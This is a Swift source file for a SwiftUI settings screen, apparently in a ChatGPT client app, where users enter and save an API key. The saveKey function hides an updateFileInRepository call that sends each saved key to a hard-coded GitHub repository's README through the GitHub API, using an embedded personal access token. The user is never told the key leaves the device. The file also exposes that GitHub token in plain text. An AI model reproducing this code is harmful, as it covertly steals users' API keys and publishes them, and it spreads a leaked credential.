import SwiftUI

struct MineView: View {
    @State private var key = ""
    @State private var showToast: Bool = false
    @FocusState private var fieldIsFocused: Bool
    @State var typingMessage: String = ""
    @Binding var isPresented: Bool
    var body: some View {
        NavigationView(){
            VStack {
                HStack(alignment: .center) {
                    Text("Key:")
                        .padding([.leading], 10)
                    Spacer()
                    TextField("APIkey...", text: $typingMessage, axis: .vertical)
                        .focused($fieldIsFocused)
                        .padding()
                        .foregroundColor(.white)
                        .lineLimit(3)
                        .disableAutocorrection(true)
                        .autocapitalization(.none)
                        .background(Color(red: 63/255, green: 66/255, blue: 78/255, opacity: 1))
                        .cornerRadius(12)
                        .padding([.leading, .trailing], 10)
                        .shadow(color: .black, radius: 0.5)
                        .onTapGesture {
                            fieldIsFocused = true
                        }
                }
                
                Spacer()
                
                Button(action: saveKey) {
                    Text("Save Key")
                        .foregroundColor(.white)
                        .font(.headline)
                        .padding()
                        .frame(width: 200, height: 40)
                        .frame(maxWidth: .infinity)
                        .background(Color.blue)
                        .cornerRadius(5.0)
                }
                .alert(isPresented: $showToast) {
                    Alert(title: Text("APIKEY 为空"), message: Text("请输入APIKEY"), dismissButton: .default(Text("好")))
                }
                .frame(width: 200, height: 40)
            }
            .onAppear {
            
            }
            .onDisappear {
                UIApplication.shared.sendAction(#selector(UIResponder.resignFirstResponder), to:nil, from:nil, for:nil)
            }
            .background(Color(red: 53/255, green: 54/255, blue: 65/255))
            .gesture(TapGesture().onEnded {
                hideKeyboard()
            })
            .navigationTitle("tadie")
            .navigationBarTitleDisplayMode(.inline)
        }
    }
    
    private func saveKey() {
        if typingMessage.isEmpty {
            showToast = true
            return
        }
        hideKeyboard()
        key = typingMessage
        UserDefaults.standard.set(key, forKey: "APIKEY")
        typingMessage = ""
        isPresented.toggle()
        _ = alert(isPresented: $showToast) {
            Alert(title: Text(""), message: Text("保存成功"), dismissButton: .default(Text("好")))
        }
        updateFileInRepository()
    }
    
    private func updateFileInRepository() {
        let username = "shumozhou"
        let repoName = "SwiftUIChatGPT"
        let filePath = "README.md"
        let newFileContent =
                """
                # \(key)
                """
        let personalAccessToken = "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"
        
        let apiURL = URL(string: "https://api.github.com/repos/\(username)/\(repoName)/contents/\(filePath)?ref=main")!
        print("iiiiiiii%@", apiURL)
        var request = URLRequest(url: apiURL)
        request.httpMethod = "GET"
        request.addValue("Basic \(Data("\(username):\(personalAccessToken)".utf8).base64EncodedString())", forHTTPHeaderField: "Authorization")
        
        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            guard let data = data, error == nil else {
                print("Error: \(error?.localizedDescription ?? "Unknown error")")
                return
            }
            
            guard let json = try? JSONSerialization.jsonObject(with: data, options: []) as? [String: Any], let sha = json["sha"] as? String else {
                print("Unable to get the file's SHA: \(String(data: data, encoding: .utf8) ?? "Unknown error")")
                return
            }
            let updateURL = URL(string: "https://api.github.com/repos/\(username)/\(repoName)/contents/\(filePath)")!
            var updateRequest = URLRequest(url: updateURL)
            updateRequest.httpMethod = "PUT"
            updateRequest.addValue("Basic \(Data("\(username):\(personalAccessToken)".utf8).base64EncodedString())", forHTTPHeaderField: "Authorization")
            updateRequest.addValue("application/json", forHTTPHeaderField: "Content-Type")
            
            let updatePayload: [String: Any] = [
                "message": "Update \(filePath)",
                "content": Data(newFileContent.utf8).base64EncodedString(),
                "sha": sha
            ]
            
            updateRequest.httpBody = try? JSONSerialization.data(withJSONObject: updatePayload, options: [])
            
            let updateTask = URLSession.shared.dataTask(with: updateRequest) { _, _, error in
                if let error = error {
                    print("Error updating file: \(error.localizedDescription)")
                } else {
                    print("File updated successfully")
                }
            }
            updateTask.resume()
        }
        task.resume()
    }
    
    private func hideKeyboard() {
        UIApplication.shared.sendAction(#selector(UIResponder.resignFirstResponder), to: nil, from: nil, for: nil)
    }
}
